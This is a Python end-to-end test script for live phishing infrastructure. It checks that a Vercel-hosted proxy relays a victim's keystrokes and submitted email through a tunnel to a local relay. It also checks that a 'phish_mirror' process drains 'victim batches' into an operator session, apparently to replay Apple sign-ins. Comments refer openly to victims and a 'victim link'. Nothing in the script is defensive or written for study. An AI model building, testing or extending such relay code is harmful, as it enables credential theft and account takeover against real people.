#!/usr/bin/env python3
"""
E2E checks that match production:
  1) Vercel proxy -> tunnel -> local relay (isolated session)
  2) Input coalescing through the proxy
  3) Running phish_mirror must drain the operator session (op1) when a victim-style batch is posted

Does NOT use headless Harbor sign-in (same stack as the mirror); that only proved JS, not Apple Continue.
"""
import json
import os
import sys
import time
import urllib.parse
import urllib.request

import phish_mirror as pm

HARBOR = os.environ.get("HARBOR", "https://harbor-ten-lake.vercel.app")
SESSION = os.environ.get("SESSION", "op1")
LOCAL = "http://127.0.0.1:8931"
FWD = os.environ.get("FWD", "").rstrip("/")
ISOLATED = "harbor-e2e-isolated"


def local_drain(session: str):
    with urllib.request.urlopen(
        f"{LOCAL}/relay/events?session={urllib.parse.quote(session)}", timeout=10
    ) as r:
        return json.loads(r.read().decode())


def relay_pending(session: str) -> int:
    with urllib.request.urlopen(f"{LOCAL}/relay/status", timeout=5) as r:
        j = json.loads(r.read().decode())
    sess = (j.get("sessions") or {}).get(session) or {}
    return int(sess.get("events_pending") or 0)


def post_json(url: str, obj: dict, *, timeout: float = 90):
    body = json.dumps(obj).encode()
    req = urllib.request.Request(
        url, data=body, method="POST", headers={"Content-Type": "application/json"}
    )
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.status, r.read()


def proxy_url() -> str:
    q = urllib.parse.quote(FWD, safe="")
    return f"{HARBOR}/api/relay/event?upstream={q}"


def test_vercel_proxy_isolated():
    urllib.request.urlopen(f"{LOCAL}/relay/reset?session={ISOLATED}", timeout=5)
    local_drain(ISOLATED)
    status, raw = post_json(
        proxy_url(),
        {
            "session": ISOLATED,
            "event": {
                "type": "submit",
                "payload": {"step": "email", "account": "proxy-check@example.com"},
                "t": 1,
            },
        },
    )
    print("proxy_post", status, raw[:80])
    time.sleep(1)
    drained = local_drain(ISOLATED)
    submits = [e for e in drained.get("events") or [] if e.get("type") == "submit"]
    if not submits:
        raise SystemExit("FAIL: Vercel proxy did not reach local relay")
    print("OK: Vercel -> tunnel -> local relay")


def test_coalesce_via_proxy():
    chunks = ["live", "live@", "live@ex", "live@example.com"]
    for i, ac in enumerate(chunks):
        status, _ = post_json(
            proxy_url(),
            {
                "session": ISOLATED,
                "event": {
                    "type": "input",
                    "payload": {"field": "account", "value": ac, "seq": i + 1},
                    "t": i + 2,
                },
            },
        )
        if status != 200:
            raise SystemExit(f"FAIL: input proxy post {status}")
    time.sleep(0.5)
    drained = local_drain(ISOLATED)
    coalesced = pm.coalesce_relay_events(drained.get("events") or [])
    inputs = [
        e
        for e in coalesced
        if e.get("type") == "input" and (e.get("payload") or {}).get("field") == "account"
    ]
    if not inputs or (inputs[-1].get("payload") or {}).get("value") != "live@example.com":
        raise SystemExit("FAIL: coalesced account input is not full email")
    print("OK: typed account inputs coalesce via proxy")


def test_mirror_consumes_operator_session():
    """Mirror on SESSION must drain victim Continue batches (local POST, same as relay ingest)."""
    marker = f"mirror-consume-{int(time.time())}@example.com"
    batch = [
        {
            "type": "email-commit",
            "payload": {"account": marker},
            "t": int(time.time() * 1000),
            "seq": 1,
        },
        {
            "type": "submit",
            "payload": {"step": "email", "account": marker},
            "t": int(time.time() * 1000) + 1,
            "seq": 2,
        },
    ]
    for ev in batch:
        status, raw = post_json(
            f"{LOCAL}/relay/event",
            {"session": SESSION, "event": ev},
            timeout=15,
        )
        if status != 200 or b'"ok"' not in raw:
            raise SystemExit(f"FAIL: local event post {status} {raw[:120]!r}")

    time.sleep(0.03)
    for _ in range(300):
        if relay_pending(SESSION) == 0:
            print(f"OK: mirror drains {SESSION!r} victim batch (relay queue empty)")
            return
        time.sleep(0.2)
    pending = relay_pending(SESSION)
    raise SystemExit(
        f"FAIL: mirror did not drain session {SESSION!r} within 60s "
        f"(events_pending={pending}). Is phish_mirror running with --session {SESSION}?"
    )


def main():
    if not FWD:
        print("Set FWD=https://your-tunnel-url", file=sys.stderr)
        sys.exit(2)

    test_vercel_proxy_isolated()
    test_coalesce_via_proxy()
    test_mirror_consumes_operator_session()

    if os.environ.get("HARBOR_E2E_BROWSER") == "1":
        print("SKIP: HARBOR_E2E_BROWSER=1 not implemented (use real device + victim link)")


if __name__ == "__main__":
    main()
